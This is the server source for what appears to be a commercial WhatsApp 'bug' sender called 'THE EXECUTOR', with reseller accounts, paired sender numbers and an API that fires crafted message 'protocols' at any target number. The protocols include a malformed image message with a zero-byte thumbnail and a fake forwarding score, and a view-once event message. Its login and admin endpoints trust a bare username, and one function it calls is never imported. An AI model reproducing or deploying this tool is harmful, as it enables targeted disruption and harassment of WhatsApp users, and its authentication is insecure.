const express = require('express');
const next = require('next');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const config = require('./config');

const dev = process.env.NODE_ENV !== 'production';
const nextApp = next({ dev });
const handle = nextApp.getRequestHandler();

const port = process.env.PORT || process.env.SERVER_PORT || config.WA_SERVER_PORT || 3000;

// Read/write DB helpers for init
const dbPath = path.join(__dirname, 'database.json');
const ownerEnvId = config.OWNER_TELEGRAM_ID ? parseInt(config.OWNER_TELEGRAM_ID, 10) : null;

function readDb() {
  try {
    if (!fs.existsSync(dbPath)) {
      const initialDb = {
        botConfig: { ownerId: ownerEnvId || 0, resellers: [] },
        users: {},
        history: {}
      };
      fs.writeFileSync(dbPath, JSON.stringify(initialDb, null, 2), 'utf8');
      return initialDb;
    }
    const data = fs.readFileSync(dbPath, 'utf8');
    const db = JSON.parse(data);
    return db;
  } catch (err) {
    console.error("Error reading database:", err);
    return { botConfig: { ownerId: ownerEnvId || 0, resellers: [] }, users: {}, history: {} };
  }
}

function writeDb(db) {
  try {
    fs.writeFileSync(dbPath, JSON.stringify(db, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error("Error writing database:", err);
    return false;
  }
}

// WhatsApp Connection Manager
const activeSessions = new Map();

function updateDbSenderStatus(username, number, isLinked) {
  const db = readDb();
  if (db.users && db.users[username] && db.users[username].whatsappSenders) {
    const senders = db.users[username].whatsappSenders;
    const sender = senders.find(s => s.number === number);
    if (sender) {
      sender.linked = isLinked;
      writeDb(db);
    }
  }
}

async function connectWASender(phoneNumber, username) {
  const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
  if (!cleanNumber) return null;

  if (activeSessions.has(cleanNumber)) {
    const existing = activeSessions.get(cleanNumber);
    if (existing.state === 'ONLINE' || existing.state === 'CONNECTING') {
      return existing;
    }
  }

  console.log(`[WA] Initializing session for ${cleanNumber}...`);
  const sessionDir = path.join(__dirname, 'sessions', cleanNumber);
  
  if (!fs.existsSync(path.join(__dirname, 'sessions'))) {
    fs.mkdirSync(path.join(__dirname, 'sessions'));
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false
  });

  const sessionObj = {
    sock,
    state: 'CONNECTING',
    phoneNumber: cleanNumber,
    username
  };
  activeSessions.set(cleanNumber, sessionObj);

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    
    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
      console.log(`[WA] Connection closed for ${cleanNumber}. Reconnecting: ${shouldReconnect}`);
      
      sessionObj.state = 'OFFLINE';
      
      if (shouldReconnect) {
        setTimeout(() => connectWASender(cleanNumber, username), 5000);
      } else {
        console.log(`[WA] Session logged out for ${cleanNumber}. Cleaning folder...`);
        activeSessions.delete(cleanNumber);
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (e) {}
        updateDbSenderStatus(username, cleanNumber, false);
      }
    } else if (connection === 'open') {
      console.log(`[WA] Connected successfully: ${cleanNumber}`);
      sessionObj.state = 'ONLINE';
      updateDbSenderStatus(username, cleanNumber, true);
    }
  });

  return sessionObj;
}

async function initAllSavedWASenders() {
  const db = readDb();
  const users = db.users || {};
  for (const uname in users) {
    const user = users[uname];
    const senders = user.whatsappSenders || [];
    for (const sender of senders) {
      try {
        await connectWASender(sender.number, uname);
      } catch (err) {
        console.error(`Failed to auto-connect ${sender.number}:`, err);
      }
    }
  }
}

// Boot Next.js and Express Custom Server
nextApp.prepare().then(() => {
  const server = express();
  server.use(cors());
  server.use(express.json());

  // Auth endpoints
  server.post('/api/login', (req, res) => {
    const { username } = req.body;
    if (!username) return res.status(400).json({ error: 'Username required' });
    const db = readDb();
    let user = db.users ? db.users[username] : null;
    if (!user && db.users) {
      user = Object.values(db.users).find(u => u.username === username) || null;
    }
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json({ success: true, username: user.username, status: user.status });
  });

  // Admin endpoints
  server.get('/api/admin/users', (req, res) => {
    const { requester } = req.query;
    if (!requester) return res.status(400).json({ error: 'Requester required' });
    const db = readDb();
    let reqUser = db.users ? db.users[requester] : null;
    if (!reqUser && db.users) {
      reqUser = Object.values(db.users).find(u => u.username === requester) || null;
    }
    if (!reqUser || (reqUser.status !== 'Owner' && reqUser.status !== 'Reseller')) {
      return res.status(403).json({ error: 'Access denied' });
    }
    res.json({ users: Object.values(db.users || {}) });
  });

  server.post('/api/admin/users', (req, res) => {
    const { requester, username, status, activeUntil, limit } = req.body;
    if (!requester || !username) return res.status(400).json({ error: 'Requester and username required' });
    const db = readDb();
    let reqUser = db.users ? db.users[requester] : null;
    if (!reqUser && db.users) {
      reqUser = Object.values(db.users).find(u => u.username === requester) || null;
    }
    if (!reqUser || (reqUser.status !== 'Owner' && reqUser.status !== 'Reseller')) {
      return res.status(403).json({ error: 'Access denied' });
    }

    if (!db.users) db.users = {};
    if (!db.users[username]) {
      db.users[username] = {
        username,
        status: status || 'User',
        activeUntil: activeUntil || '2026-12-31',
        limit: limit !== undefined ? parseInt(limit, 10) : 10,
        whatsappSenders: []
      };
    } else {
      db.users[username].status = status || db.users[username].status;
      db.users[username].activeUntil = activeUntil || db.users[username].activeUntil;
      if (limit !== undefined) db.users[username].limit = parseInt(limit, 10);
    }

    writeDb(db);
    res.json({ success: true, user: db.users[username] });
  });

  server.delete('/api/admin/users', (req, res) => {
    const { requester, username } = req.body;
    if (!requester || !username) return res.status(400).json({ error: 'Requester and username required' });
    const db = readDb();
    let reqUser = db.users ? db.users[requester] : null;
    if (!reqUser && db.users) {
      reqUser = Object.values(db.users).find(u => u.username === requester) || null;
    }
    if (!reqUser || reqUser.status !== 'Owner') {
      return res.status(403).json({ error: 'Access denied. Only Owner can delete.' });
    }

    if (db.users && db.users[username]) {
      delete db.users[username];
      writeDb(db);
      return res.json({ success: true });
    }
    res.status(404).json({ error: 'User not found' });
  });

  // WhatsApp endpoints
  server.get('/api/senders', (req, res) => {
    const { username } = req.query;
    if (!username) return res.status(400).json({ error: 'Username required' });

    const db = readDb();
    let user = db.users ? db.users[username] : null;
    if (!user && db.users) {
      user = Object.values(db.users).find(u => u.username === username) || null;
    }
    if (!user) return res.status(404).json({ error: 'User not found' });

    const senders = user.whatsappSenders || [];
    const detailedSenders = senders.map(s => {
      const active = activeSessions.get(s.number);
      return {
        number: s.number,
        linked: active ? (active.state === 'ONLINE') : false,
        state: active ? active.state : 'OFFLINE',
        connectedAt: s.connectedAt
      };
    });

    res.json({ whatsappSenders: detailedSenders });
  });

  function addSenderToDb(username, number) {
    const db = readDb();
    if (db.users && db.users[username]) {
      const user = db.users[username];
      if (!user.whatsappSenders) user.whatsappSenders = [];
      
      const exists = user.whatsappSenders.some(s => s.number === number);
      if (!exists) {
        user.whatsappSenders.push({
          number,
          linked: false,
          connectedAt: new Date().toISOString().replace('T', ' ').substring(0, 16)
        });
        writeDb(db);
      }
    }
  }

  server.post('/api/pair', async (req, res) => {
    const { username, number } = req.body;
    if (!username || !number) return res.status(400).json({ error: 'Username and number required' });

    const cleanNumber = number.replace(/[^0-9]/g, '');
    if (!cleanNumber) return res.status(400).json({ error: 'Invalid phone number format' });

    try {
      const session = await connectWASender(cleanNumber, username);
      if (!session) return res.status(500).json({ error: 'Failed to initialize session' });

      await delay(3500);

      if (session.sock.authState.creds.registered) {
        addSenderToDb(username, cleanNumber);
        return res.json({ success: true, alreadyLinked: true });
      }

      console.log(`[WA] Requesting pairing code for ${cleanNumber}...`);
      const code = await session.sock.requestPairingCode(cleanNumber);
      console.log(`[WA] Code retrieved: ${code}`);

      addSenderToDb(username, cleanNumber);
      res.json({ success: true, pairingCode: code });
    } catch (err) {
      console.error(`[WA] Error in pairing request:`, err);
      res.status(500).json({ error: err.message || 'Error during pairing request' });
    }
  });

  server.post('/api/disconnect', async (req, res) => {
    const { username, number } = req.body;
    if (!username || !number) return res.status(400).json({ error: 'Username and number required' });

    const cleanNumber = number.replace(/[^0-9]/g, '');
    
    const db = readDb();
    if (db.users && db.users[username] && db.users[username].whatsappSenders) {
      db.users[username].whatsappSenders = db.users[username].whatsappSenders.filter(s => s.number !== cleanNumber);
      writeDb(db);
    }

    const session = activeSessions.get(cleanNumber);
    if (session) {
      try {
        session.sock.logout();
      } catch (e) {}
      activeSessions.delete(cleanNumber);
    }

    const sessionDir = path.join(__dirname, 'sessions', cleanNumber);
    try {
      fs.rmSync(sessionDir, { recursive: true, force: true });
    } catch (e) {}

    res.json({ success: true });
  });

  // Helper Async Functions untuk memproses pengiriman pesan berdasarkan Protokol

  async function BufferImg(sock, jid) {
    const LxP = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/579315043_1275074854838813_3136724517646332783_n.enc?ccb=11-4&oh=01_Q5Aa4gEjQyLUS-FVZFFfKjl3ApcSrac94zhgNbKyB1qogTN7QQ&oe=6A33DCE6&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "YoOZJFDnvu0JFeQY/9OSAX5/mmGRbowl2nyyH1Pma0Q=",
        fileLength: "179554",
        height: 1271,
        width: 1280,
        mediaKey: "X1wBjPCCvZVntAPBOKhzD4GBi8sP8lqHIRvLCtARiCA=",
        fileEncSha256: "ozfEQ6yWVFYyPVj2cf5TFfXAedks3pTdzxuENKWCLmg=",
        directPath: "/v/t62.7118-24/579315043_1275074854838813_3136724517646332783_n.enc?ccb=11-4&oh=01_Q5Aa4gEjQyLUS-FVZFFfKjl3ApcSrac94zhgNbKyB1qogTN7QQ&oe=6A33DCE6&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1779202167",
        jpegThumbnail: Buffer.from([0x00]),
        contextInfo: {
          pairedMediaType: "SD_IMAGE_PARENT",
          statusSourceType: "IMAGE",
          isForwarded: true,
          forwardingScore: 999,
          externalAdReply: {
            title: "location",
            body: "@FunctionBug telegram ofc",
            mediaType: 1,
            thumbnail: Buffer.from([0x00]),
            sourceUrl: "https://t.me/FunctionBug",
            renderLargerThumbnail: true,
            showAdAttribution: true
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          }
        },
        scansSidecar: "Nft/7Cf7Ti4X3mAsjE6u5ggVEPn60GJJfTGcm8oW/ng9mUcX/uonxQ==",
        scanLengths: [14958, 73513, 41498, 49585],
        midQualityFileSha256: "dOxjsI60hqoFv5mEpdAZmDo19QUVusopbLNdQYtaPfo="
      }
    };

    const msg = generateWAMessageFromContent(sock, jid, LxP, {
      userJid: sock.user.id
    });

    await sock.relayMessage(jid, msg.message, {
      messageId: msg.key.id,
      participant: jid,
    }).catch(() => {});
  }

  async function sendProtocolAlpha(sock, jid) {
    const messageContent = {
      text: `⚡ *THE EXECUTOR v1.0* ⚡\n\n🔒 *Payload Protocol:* Alpha\n📈 *Status:* Deployed Successfully\n\nDeveloped by @VANNESSWANGSAFF`
    };
    return await sock.sendMessage(jid, messageContent);
  }

  async function sendProtocolBeta(sock, jid) {
    const messageContent = {
      text: `NGETEST AJAH`,
      contextInfo: {
        externalAdReply: {
          title: "THE EXECUTOR",
          body: "This is Only Tester",
          mediaType: 1,
          sourceUrl: "https://t.me/VannessWangsaff",
          renderLargerThumbnail: false
        }
      }
    };
    return await sock.sendMessage(jid, messageContent);
  }

  async function sendProtocolEvent(sock, jid) {
    const messageContent = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: Buffer.alloc(32, 1)
          },
          eventMessage: {
            isCanceled: false,
            name: "THE EXECUTOR EVENT",
            description: "Authorized System Meeting",
            location: {
              degreesLatitude: -6.200000, 
              degreesLongitude: 106.816666, 
              name: "Virtual Node Room",
              address: "Online Gateway"
            },
            extraGuestsAllowed: true,
            hasReminder: true,
            reminderOffsetSec: 3600,
            joinLink: "https://call.whatsapp.com/video/example-meeting",
            startTime: Math.floor(Date.now() / 1000) + 3600,
            endTime: null
          }
        }
      }
    };
    return await sock.relayMessage(jid, messageContent, { messageId: null });
  }

  // ── DAFTAR PROTOKOL (REGISTRY) ──
  const protocolHandlers = {
    'A': sendProtocolAlpha,
    'B': sendProtocolBeta,
    'C': sendProtocolEvent,
    'D': BufferImg,
  };

  server.post('/api/send', async (req, res) => {
    const { username, senderNumber, targetNumber, protocol } = req.body;
    if (!username || !targetNumber) {
      return res.status(400).json({ error: 'Missing parameters' });
    }

    let activeSenderNum = senderNumber ? senderNumber.replace(/[^0-9]/g, '') : null;
    
    if (!activeSenderNum) {
      const db = readDb();
      const user = db.users ? db.users[username] : null;
      const senders = user ? user.whatsappSenders || [] : [];
      const onlineSender = senders.find(s => {
        const active = activeSessions.get(s.number);
        return active && active.state === 'ONLINE';
      });
      if (onlineSender) {
        activeSenderNum = onlineSender.number;
      }
    }

    if (!activeSenderNum) {
      return res.status(400).json({ error: 'No active online WhatsApp sender found.' });
    }

    const session = activeSessions.get(activeSenderNum);
    if (!session || session.state !== 'ONLINE') {
      return res.status(400).json({ error: `Sender ${activeSenderNum} is not currently ONLINE.` });
    }

    try {
      const cleanTarget = targetNumber.replace(/[^0-9]/g, '');
      const jid = `${cleanTarget}@s.whatsapp.net`;
      
      console.log(`[WA] Memproses pengiriman dari ${activeSenderNum} ke ${jid} menggunakan Protocol: ${protocol}...`);

      const handler = protocolHandlers[protocol] || protocolHandlers['A'];
      let logPayload = `Protocol ${protocol || 'A'}`;

      if (protocol === 'B') {
        logPayload = 'Protocol Beta (Ad Reply)';
      } else if (protocol === 'C') {
        logPayload = 'Protocol Charlie (Event)';
      } else {
        logPayload = 'Protocol Alpha (Text)';
      }

      await handler(session.sock, jid);
      
      addHistoryRecord(username, activeSenderNum, cleanTarget, logPayload, 'Success');
      res.json({ success: true, senderUsed: activeSenderNum });
    } catch (err) {
      console.error(`[WA] Send message error:`, err);
      addHistoryRecord(username, activeSenderNum, targetNumber, `Failed: ${protocol || 'Alpha'}`, 'Failed');
      res.status(500).json({ error: err.message || 'Failed to send message' });
    }
  });

  function addHistoryRecord(username, sender, target, payload, status) {
    const db = readDb();
    if (!db.history) db.history = {};
    if (!db.history[username]) db.history[username] = [];

    const newId = db.history[username].length > 0 
      ? Math.max(...db.history[username].map(h => h.id)) + 1 
      : 1;

    db.history[username].push({
      id: newId,
      date: new Date().toISOString().replace('T', ' ').substring(0, 19),
      target: target,
      payload: `WA Sender: ${sender} | Msg: ${payload}`,
      status: status
    });

    writeDb(db);
  }

  // Next.js page fallback handler
  server.all('*any', (req, res) => {
    return handle(req, res);
  });

  server.listen(port, (err) => {
    if (err) throw err;
    console.log(`📡 Unified Server (Next.js & WhatsApp API) is running on port ${port}`);
    
    // START TELEGRAM BOT in the same process
    try {
      require('./bot.js');
    } catch (err) {
      console.error("Error loading Telegram Bot:", err);
    }

    // AUTO-CONNECT SENDERS
    initAllSavedWASenders();
  });
}).catch(err => {
  console.error("Error booting custom server:", err);
  process.exit(1);
});
